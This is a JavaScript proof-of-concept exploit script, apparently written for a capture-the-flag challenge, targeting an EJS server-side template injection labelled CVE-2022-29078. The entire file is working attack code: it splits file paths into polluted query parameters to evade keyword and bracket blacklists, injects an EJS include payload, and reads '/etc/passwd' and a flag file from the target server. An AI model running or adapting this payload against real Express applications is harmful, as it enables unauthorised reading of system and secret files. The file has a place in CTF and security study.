// PoC Exploit for Justify lylera Secret SSTI Vulnerability EJS CVE-2022-29078

const TARGET_URL = 'http://challenge.ara-its.id:3333';


function createPollutionPayload(filePath) {
    let params = [];
    
    // 1. Split the string into parameter indices (Bypassing word & '[ ]' blacklists)
    for (let i = 0; i < filePath.length; i++) {
        params.push(`obj[raw][${i}]=${encodeURIComponent(filePath[i])}`);
    }
    
    // 2. Add the 'length' property (Forces Express to parse it as a pure Object instead of an Array)
    params.push(`obj[raw][length]=${filePath.length}`);
    
    // 3. Insert the SSTI payload to execute String.raw
    const ejsPayload = '<%-include(String.raw(obj))%>';
    params.push(`msg=${encodeURIComponent(ejsPayload)}`);
    
    return params.join('&');
}

async function sendExploit(filePath) {
    console.log(`\n[*] Preparing payload to read: ${filePath}`);
    const query = createPollutionPayload(filePath);
    const url = `${TARGET_URL}/?${query}`;
    
    console.log(`[*] Target URL (Length: ${url.length} chars)`);
    console.log(`[*] Sending request...`);
    
    try {
        const response = await fetch(url);
        const text = await response.text();
        
        console.log(`[+] Execution successful! Output:`);
        console.log("\n==================== OUTPUT START ====================");
        
        console.log(text.trim());
        
        console.log("===================== OUTPUT END =====================\n");
    } catch (error) {
        console.error(`[-] Failed to execute exploit:`, error.message);
    }
}


async function runPoc() {
    console.log("=== PoC Exploit ===");
    
    await sendExploit('/etc/passwd');
    
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    //for get the flag
    await sendExploit('/app/flag.txt');
    
}

runPoc();
